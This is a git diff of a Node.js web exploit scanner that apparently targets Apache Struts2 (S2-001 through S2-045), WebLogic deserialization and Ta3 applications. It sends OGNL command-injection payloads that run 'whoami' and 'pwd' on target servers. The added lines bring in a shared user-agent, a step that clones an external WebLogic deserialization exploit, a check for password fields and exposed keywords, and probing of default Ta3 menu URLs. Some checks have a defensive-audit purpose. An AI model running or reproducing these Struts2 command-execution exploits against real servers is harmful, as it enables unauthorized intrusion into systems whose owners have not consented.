@@ -2,10 +2,12 @@ var szMyName = 'M.T.X._2017-06-08',
 	request = require('request'),
 	urlObj = require('url'),
 	net = require('net'),
+	fs = require('fs'),
 	url = "",bReDo = false, szLstLocation = "",
 	g_oRst = {},
 	a = process.argv.splice(2),
 	bRunHost = false,
+	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend",
 	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
@@ -101,10 +103,11 @@ function fnDoHostAttack(url,fnCbk)
 		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
 		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
 		// checkWeblogicT3(host,port);
+		fnCheckJavaFx([host,port].join(":"));
 		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
 			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
 				+ szMyName 
-				+ ') AppleWebKit/602.3.12 (KHTML, like Gecko) Version/8.0 Mobile/14C92 Safari/602.3.12 MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
+				+ ') ' + g_szUa + ' MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
 		+ '\r\n\r\n',
 			function(data)
 		{
@@ -322,6 +325,8 @@ function myLog(a)
 g_oRst.struts2 || (g_oRst.struts2 = {});
 function fnDoBody(body,t,rep)
 {
+	var e = fnGetErrMsg(body);
+	if(e)g_oRst.errMsg = e;
 	// console.log(t);
 	var oCa = arguments.callee.caller.arguments;
 	if(!rep)rep = oCa[1];
@@ -399,7 +404,7 @@ function doStruts2_045(url, fnCbk)
 	request({method: 'POST',uri: url
 	    ,headers:
 	    {
-	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"User-Agent": g_szUa,
 	    	// encodeURIComponent不能编码 2017-07-18
 	    	"Content-Type":g_postData
 	    }}
@@ -445,7 +450,7 @@ function doStruts2_019(url, fnCbk)
 		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
 	    ,headers:
 	    {
-	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"User-Agent": g_szUa,
 	    	"Content-Type":"application/x-www-form-urlencoded"
 	    }}
 	  , function (error, response, body){
@@ -482,7 +487,7 @@ function doStruts2_029(url, fnCbk)
 		"formData":{"message":encodeURIComponent(szDPt)}
 	    ,headers:
 	    {
-	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"User-Agent": g_szUa,
 	    	"Content-Type":"application/x-www-form-urlencoded"
 	    }}
 	  , function (error, response, body){
@@ -506,6 +511,117 @@ function fnTestAll()
 		fnTest(aMethod[k]);
 }
 
+// 反序列化检测
+// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.178.10.1/24:7001
+function fnCheckJavaFx(s)
+{
+	var szF = "~/safe/mtx_jfxl/bin/jfxl.jar";
+	if(!fs.existsSync(szF))console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git");
+	else
+	{
+		szF = "java -jar " + szF + " " + s;
+	}
+}
+
+function fnCheckKeys(b)
+{
+	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
+	g_oRst.checkKeys || (g_oRst.checkKeys = {});
+
+	if(!g_oRst.checkKeys.passwordInputs)
+	{
+		while(a = re.exec(b))
+		{
+			if(!r1.exec(a[0]))
+			{
+				r.push(a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," "));
+			}
+		}
+		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
+	}
+	if(!g_oRst.checkKeys.keys)
+	{
+		s = __dirname + "/urls/keywords";
+		a = new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
+		re = [];
+		while(s = a.exec(b))
+		{
+			re.push(s[1]);
+		}
+		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
+	}
+}
+
+// 获取Ta3异常消息
+function fnGetErrMsg(body)
+{
+	if(body)
+	{
+		fnCheckKeys(body);
+		var s1 = "Base._dealdata(", i = body.indexOf(s1);
+		if(-1 < i)body = body.substr(i + s1.length);
+		s1 = "});";
+		i = body.indexOf(s1);
+		if(-1 < i)body = body.substr(0, i + 1);
+		try
+		{
+			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
+			return o.errorDetail;
+		}catch(e)
+		{
+			var bHv = false;
+			i = body.indexOf("at com.yinhai.");
+			if(bHv = -1 < i)body = body.substr(i - 11);
+			i = body.indexOf("at org.springframework.web.filter.DelegatingFilterProxy.doFilter");
+			if(-1 < i)bHv = true,body = body.substr(0,i);
+			if(bHv)return body;
+		}
+	}
+	return "";
+}
+// 检查ta3默认菜单
+function fnCheckTa3(u)
+{
+	var j = u.lastIndexOf('/');
+	if(10 < j)u = u.substr(0, j + 1);
+	else u += '/';
+	var s = __dirname + "/urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
+	{
+		request({method: 'GET',uri: u + url
+		    ,headers:
+		    {
+		    	"User-Agent": g_szUa
+		    }
+		}
+		, function (error, response, body)
+		{
+			if(body)
+			{
+				fnDoBody(body,"ta3menus");
+				if(200 === response.statusCode)
+				{
+					var re = /<title>([^<]*)<\/title>/gmi, t = re.exec(body);
+					t && (t = t[1].trim());t || (t = "");
+					g_oRst.ta3menus || (g_oRst.ta3menus = {});
+					g_oRst.ta3menus.des = "这些url响应http 200";
+					g_oRst.ta3menus.urls  || (g_oRst.ta3menus.urls = []);
+					g_oRst.ta3menus.urls.push([u + url,t].json(","));
+				}
+			}
+		});
+	};
+	if(fs.existsSync(s))
+	{
+		a = String(fs.readFileSync(s)).trim().split(/\n/);
+		for(; i < a.length; i++)
+		{
+			// console.log(a[i]);
+			fnCbk(a[i]);
+		}
+	}
+	
+}
+
 // java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.10.115:8080
 /*
 request.get(
@@ -519,6 +635,7 @@ request.get(
 if(0 < a.length)
 {
 	//*
+	fnCheckTa3(url);
 	doStruts2_001(url);
 	doStruts2_016(url);
 	doStruts2_019(url);
@@ -535,6 +652,7 @@ if(0 < a.length)
 	fnTestAll();
 	////////////////////*/
 }
+
 // checkWeblogicT3("192.168.10.133",9001);
 process.on('exit', (code) => 
 {
